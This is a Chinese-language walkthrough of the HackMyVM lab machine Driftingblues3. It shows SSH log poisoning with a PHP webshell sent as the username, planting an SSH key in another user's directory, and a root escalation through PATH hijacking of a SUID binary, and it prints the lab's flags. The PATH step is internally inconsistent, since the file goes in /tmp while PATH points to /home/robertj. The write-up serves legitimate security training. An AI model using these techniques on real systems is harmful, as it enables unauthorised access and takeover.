# Driftingblues3

2024-11-06 https://hackmyvm.eu/machines/machine.php?vm=Driftingblues3

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

robots.txt 中发现禁止目录：/eventadmins 其内容提示 ssh 有问题，并让查看 /littlequeenofspades.html 页面，查看其源码，发现最后一行有一个隐藏信息：

```
<p style="color:white">aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==</p>
```

经过 2 次 base64 解码为/adminsfixit.php 发现了这个文件在读取 ssh auth log，那么就可以利用在 ssh 中植入 php rce 代码，来实现代码命令注入的功能。

高本版的 openssh 中已经对用户名的特殊字符进行了限制，必须使用低版本的 openssh 才行。直接使用 msf 中的 scanner/ssh/ssh_login 模块，username 为 <?php system($_GET[1]);?>，同时随便设置 PASSWORD，然后 run，这时在访问 http://192.168.5.40/adminsfixit.php?1=id 发现显示出了 www-data 内容，证明代码注入成功，可以进一步实现反弹 web shell。

进入系统后，发现 /home/robertj/.ssh 目录对 www-data 用户有写权限，直接创建 .authorized_keys 将我们的公钥写入其中:

```
ssh-keygen -t rsa -f ./id_rsa

echo '公钥信息' > /home/robertj/.ssh/authorized_keys
```

使用 ssh -i id_rsa 登陆，得到了 user flag：

```
robertj@driftingblues:~$ cat user.txt
413fc08db21285b1f8abea99040b0280
```

提权至 root，发现 suid 文件 /usr/bin/getinfo , robertj 属于 operators 用户组，可以执行。对 /usr/bin/getinfo 进行逆向分析，发现其中调用了系统命令没有使用绝对路径 system("ip a"); 可以进行利用，在 /tmp 目录下创建 echo '/bin/bash' > ip;chmod +x ip 然后在 /tmp 目录下再次执行 export PATH=/home/robertj:$PATH; /usr/bin/getinfo 就可以获得 root 权限，最终获得了 root flag：

```
root@driftingblues:/root# cat root.txt
dfb7f604a22928afba370d819b35ec83
```
